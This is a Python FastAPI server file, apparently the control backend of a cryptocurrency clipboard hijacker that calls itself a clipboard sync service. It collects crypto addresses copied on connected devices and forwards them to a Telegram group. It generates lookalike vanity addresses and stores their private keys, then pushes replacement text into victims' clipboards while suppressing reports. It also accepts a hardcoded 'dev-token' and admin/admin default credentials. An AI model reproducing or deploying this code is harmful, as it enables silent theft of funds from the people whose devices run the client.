from __future__ import annotations

import asyncio
import json
import os
import time
import aiohttp
from datetime import datetime, timedelta
from typing import Any, Dict, Optional

import jwt
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Header, Depends, Body
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from rules import apply_sync_rules
from db import init_db, get_session, Device, SysSettings, MessageDeviceMapping, GeneratedAddress, upsert_device
from sqlalchemy.orm import Session
from telegram_utils import send_address_to_telegram
from telegram_bot import start_telegram_bot, stop_telegram_bot
from vanity_service_client import VanityServiceClient

app = FastAPI()
connected_clients: dict[str, WebSocket] = {}
telegram_bot_task: Optional[asyncio.Task] = None

app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:5173", "http://127.0.0.1:5173", "*"],
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
)

JWT_SECRET = os.environ.get("JWT_SECRET", "dev-secret")


def verify_jwt(token: str) -> Dict[str, Any]:
    try:
        if token == "dev-token":
            return {"sub": "dev"}
        return jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
    except Exception as e:
        raise ValueError(f"invalid token: {e}")


@app.get("/")
def index() -> HTMLResponse:
    return HTMLResponse("<pre>Clipboard WS running. Connect to /ws/clipboard</pre>")


@app.on_event("startup")
async def on_startup() -> None:
    init_db()
    # 启动Telegram机器人
    global telegram_bot_task
    telegram_bot_task = asyncio.create_task(start_telegram_bot(connected_clients))


@app.on_event("shutdown")
async def on_shutdown() -> None:
    # 停止Telegram机器人
    global telegram_bot_task
    stop_telegram_bot()
    if telegram_bot_task:
        telegram_bot_task.cancel()
        try:
            await telegram_bot_task
        except asyncio.CancelledError:
            pass


# catch-all OPTIONS to satisfy some proxies/browsers
from fastapi import Response  # noqa: E402


@app.options("/{path:path}")
def preflight(path: str) -> Response:  # noqa: ARG001
    return Response(status_code=204)


def admin_guard(authorization: str = Header(default="")) -> None:
    token = authorization
    if token.lower().startswith("bearer "):
        token = token[7:].strip()
    if not token:
        token = "dev-token"
    try:
        verify_jwt(token)
    except Exception:
        raise HTTPException(status_code=403, detail="forbidden")


@app.post("/admin/login")
def admin_login(body: Dict[str, Any] = Body(...)) -> Dict[str, Any]:
    username = (body or {}).get("username") or ""
    password = (body or {}).get("password") or ""
    admin_user = os.environ.get("ADMIN_USER", "admin")
    admin_pass = os.environ.get("ADMIN_PASS", "admin")
    if username != admin_user or password != admin_pass:
        raise HTTPException(status_code=401, detail="invalid credentials")
    exp = datetime.utcnow() + timedelta(hours=12)
    token = jwt.encode({"sub": username, "role": "admin", "exp": exp}, JWT_SECRET, algorithm="HS256")
    return {"token": token}


@app.get("/admin/devices")
def list_devices(_: None = Depends(admin_guard)) -> JSONResponse:
    with get_session() as db:
        items = db.query(Device).all()
        return JSONResponse([
            {
                "deviceId": d.device_id,
                "fingerprint": d.fingerprint,
                "ip": d.ip,
                "note": d.note,
                "lastClipText": d.last_clip_text,
                "lastSeen": d.last_seen,
                "connected": d.connected,
            }
            for d in items
        ])


@app.get("/admin/stats")
def stats(_: None = Depends(admin_guard)) -> Dict[str, Any]:
    with get_session() as db:
        total = db.query(Device).count()
        online = db.query(Device).filter(Device.connected == True).count()  # noqa: E712
        return {"total": total, "online": online}


@app.get("/admin/stats/daily")
def daily_stats(_: None = Depends(admin_guard)) -> Dict[str, Any]:
    """获取最近7天的每日活跃设备数"""
    import time
    from datetime import datetime, timedelta
    
    with get_session() as db:
        # 获取最近7天的日期列表
        dates = []
        daily_active = []
        
        for i in range(6, -1, -1):  # 从6天前到今天
            date = datetime.now() - timedelta(days=i)
            date_str = date.strftime("%m-%d")
            dates.append(date_str)
            
            # 计算当天的开始和结束时间戳
            start_of_day = int(datetime(date.year, date.month, date.day).timestamp())
            end_of_day = start_of_day + 86400  # 24小时
            
            # 查询在这一天内有活动的设备数
            active_count = db.query(Device).filter(
                Device.last_seen >= start_of_day,
                Device.last_seen < end_of_day
            ).count()
            
            daily_active.append(active_count)
        
        return {
            "dates": dates,
            "values": daily_active
        }


@app.patch("/admin/devices/{device_id}/note")
def update_note(device_id: str, body: Dict[str, Any] = Body(...), _: None = Depends(admin_guard)) -> Dict[str, Any]:
    note = (body or {}).get("note")
    with get_session() as db:
        upsert_device(db, device_id=device_id, note=note)
    return {"ok": True}


@app.post("/admin/devices/{device_id}/push-set")
async def push_set(device_id: str, body: Dict[str, Any] = Body(...), _: None = Depends(admin_guard)) -> Dict[str, Any]:
    # 检查设备的last_clip_text是否为空
    with get_session() as db:
        device = db.query(Device).filter(Device.device_id == device_id).first()
        if not device or not device.last_clip_text:
            return {"ok": False, "delivered": False, "error": "设备剪贴板为空或不是加密货币地址，无法推送"}
    
    ws = connected_clients.get(device_id)
    delivered = False
    if ws is not None:
        set_obj = body.get("set") or {"format": body.get("format", "text/plain"), "text": body.get("text", "")}
        msg = {"type": "PUSH_SET", "set": set_obj, "reason": "admin-push"}
        try:
            await ws.send_text(json.dumps(msg))
            delivered = True
        except Exception:
            delivered = False
    return {"ok": True, "delivered": delivered}


@app.get("/admin/settings")
def get_settings(_: None = Depends(admin_guard)) -> Dict[str, Any]:
    """获取系统设置"""
    with get_session() as db:
        settings = db.query(SysSettings).all()
        return {
            "settings": [
                {
                    "id": s.id,
                    "key": s.key,
                    "value": s.value,
                    "description": s.description,
                    "created_at": s.created_at,
                    "updated_at": s.updated_at
                }
                for s in settings
            ]
        }


@app.put("/admin/settings/{key}")
def update_setting(key: str, body: Dict[str, Any] = Body(...), _: None = Depends(admin_guard)) -> Dict[str, Any]:
    """更新系统设置"""
    value = body.get("value", "")
    
    with get_session() as db:
        setting = db.query(SysSettings).filter(SysSettings.key == key).first()
        if not setting:
            raise HTTPException(status_code=404, detail=f"Setting '{key}' not found")
        
        setting.value = value
        setting.updated_at = int(time.time())
        db.commit()
        
        return {"ok": True, "message": "Setting updated successfully"}


@app.post("/admin/settings/test-telegram")
async def test_telegram(_: None = Depends(admin_guard)) -> Dict[str, Any]:
    """测试Telegram连接"""
    with get_session() as db:
        bot_token = db.query(SysSettings).filter(SysSettings.key == "tg_bot_token").first()
        chat_id = db.query(SysSettings).filter(SysSettings.key == "tg_chat_id").first()
        
        if not bot_token or not bot_token.value:
            return {"ok": False, "message": "请先配置机器人Token"}
        
        if not chat_id or not chat_id.value:
            return {"ok": False, "message": "请先配置群组ID"}
    
    # 测试消息
    test_message = f"✅ 剪贴板管理系统 - Telegram连接测试成功！\n\n时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    
    url = f"https://api.telegram.org/bot{bot_token.value}/sendMessage"
    payload = {
        "chat_id": chat_id.value,
        "text": test_message,
        "parse_mode": "HTML"
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload) as resp:
                if resp.status == 200:
                    return {"ok": True, "message": "测试消息已发送到Telegram群组"}
                else:
                    error = await resp.text()
                    return {"ok": False, "message": f"发送失败: {error}"}
    except Exception as e:
        return {"ok": False, "message": f"连接失败: {str(e)}"}


@app.post("/admin/devices/{device_id}/generate-similar")
async def generate_similar(device_id: str, _: None = Depends(admin_guard)) -> Dict[str, Any]:
    """为设备剪贴板中的地址生成相似地址"""
    # 获取设备当前剪贴板内容
    with get_session() as db:
        device = db.query(Device).filter(Device.device_id == device_id).first()
        if not device:
            raise HTTPException(status_code=404, detail="设备不存在")
        
        if not device.last_clip_text:
            return {"success": False, "error": "设备剪贴板为空"}
        
        original_address = device.last_clip_text
    
    # 使用Vanity服务生成地址
    async with VanityServiceClient() as client:
        # 先检查服务是否可用
        if not await client.health_check():
            return {"success": False, "error": "地址生成服务不可用"}
        
        # 调用生成服务（不限制时间，直到生成成功）
        result = await client.generate_sync(
            address=original_address,
            timeout=0,  # 无限制，生成到找到为止
            use_gpu=True
        )
    
    if result['success']:
        # 保存到数据库
        with get_session() as db:
            generated = GeneratedAddress(
                device_id=device_id,
                original_address=result['original_address'],
                generated_address=result['generated_address'],
                private_key=result['private_key'],
                address_type=result['address_type'],
                balance="0"  # 新地址余额为0
            )
            db.add(generated)
            db.commit()
            
            return {
                "success": True,
                "data": {
                    "id": generated.id,
                    "original_address": result['original_address'],
                    "generated_address": result['generated_address'],
                    "private_key": result['private_key'],
                    "address_type": result['address_type'],
                    "balance": "0",
                    "attempts": result.get('attempts', 0),
                    "generation_time": result.get('generation_time', 0)
                }
            }
    else:
        return result


@app.get("/admin/devices/{device_id}/generated-addresses")
def get_generated_addresses(device_id: str, _: None = Depends(admin_guard)) -> Dict[str, Any]:
    """获取设备生成的地址历史"""
    with get_session() as db:
        addresses = db.query(GeneratedAddress).filter(
            GeneratedAddress.device_id == device_id
        ).order_by(GeneratedAddress.created_at.desc()).limit(50).all()
        
        return {
            "addresses": [
                {
                    "id": addr.id,
                    "original_address": addr.original_address,
                    "generated_address": addr.generated_address,
                    "private_key": addr.private_key,
                    "address_type": addr.address_type,
                    "balance": addr.balance,
                    "created_at": addr.created_at
                }
                for addr in addresses
            ]
        }


@app.websocket("/ws/clipboard")
async def ws_clipboard(ws: WebSocket):
    token = ws.query_params.get("token")
    device_id = ws.query_params.get("deviceId", "unknown")
    if not token:
        await ws.close(code=4401)
        return

    try:
        verify_jwt(token)
    except Exception:
        await ws.close(code=4403)
        return

    await ws.accept()
    device_id = ws.query_params.get("deviceId", "unknown")
    connected_clients[device_id] = ws
    with get_session() as db:
        upsert_device(db, device_id=device_id, ip=(ws.client.host if ws.client else None), connected=True)

    try:
        while True:
            msg = await asyncio.wait_for(ws.receive_text(), timeout=30.0)
            data = json.loads(msg)
            if data.get("type") == "PING":
                await ws.send_text(json.dumps({"type": "PONG"}))
                continue
            if data.get("type") == "CLIPBOARD_CHANGE":
                # 检查是否是清空信号
                is_clear_signal = data.get("isClearSignal", False)
                address_type = data.get("addressType")
                
                # log clipboard content (text preview)
                payload = (data.get("payload") or {})
                preview = payload.get("text") or ""
                formats = data.get("formats") or []
                
                # 获取设备信息
                device_ip = ws.client.host if ws.client else None
                device_note = None
                
                if is_clear_signal:
                    # 收到清空信号，清空数据库中的last_clip_text
                    print(f"[CLEAR SIGNAL] device={device_id} - 剪贴板内容已切换为非地址文本", flush=True)
                    with get_session() as db:
                        device = upsert_device(db, device_id=device_id, ip=device_ip, last_clip_text="", connected=True)
                        device_note = device.note
                elif address_type:
                    # 收到地址内容
                    print(f"[ADDRESS] device={device_id} type={address_type} text={preview}", flush=True)
                    with get_session() as db:
                        device = upsert_device(db, device_id=device_id, ip=device_ip, last_clip_text=preview, connected=True)
                        device_note = device.note
                    
                    # 发送到Telegram
                    await send_address_to_telegram(device_id, device_ip, device_note, preview, address_type)
                else:
                    # 不应该收到其他类型的消息（客户端应该过滤了）
                    print(f"[WARNING] device={device_id} 收到意外的剪贴板内容", flush=True)
                    continue

                # apply sync rules for realtime mutation
                now_ms = int(time.time() * 1000)
                mutated, reason = apply_sync_rules(data)
                mutation = {
                    "type": "MUTATION",
                    "targetSeq": data.get("seq"),
                    "expectedHash": data.get("hash"),
                    "deadline": now_ms + 600,
                    "set": ({
                        "format": "text/plain",
                        "text": mutated,
                    } if mutated is not None else None),
                    "suppressReport": True,
                    "reason": reason,
                }
                if mutated is None:
                    await ws.send_text(json.dumps({"type": "NOOP", "targetSeq": data.get("seq"), "reason": reason}))
                else:
                    await ws.send_text(json.dumps(mutation))
            else:
                await ws.send_text(json.dumps({"type": "NOOP"}))
    except asyncio.TimeoutError:
        # heartbeat timeout
        await ws.close(code=1000)
    except WebSocketDisconnect:
        pass
    finally:
        device_id = ws.query_params.get("deviceId", "unknown")
        if connected_clients.get(device_id) is ws:
            connected_clients.pop(device_id, None)
        with get_session() as db:
            upsert_device(db, device_id=device_id, connected=False)


def run():
    import uvicorn

    port = int(os.environ.get("PORT", "8001"))
    uvicorn.run("main:app", host="0.0.0.0", port=port, reload=False)


if __name__ == "__main__":
    run()

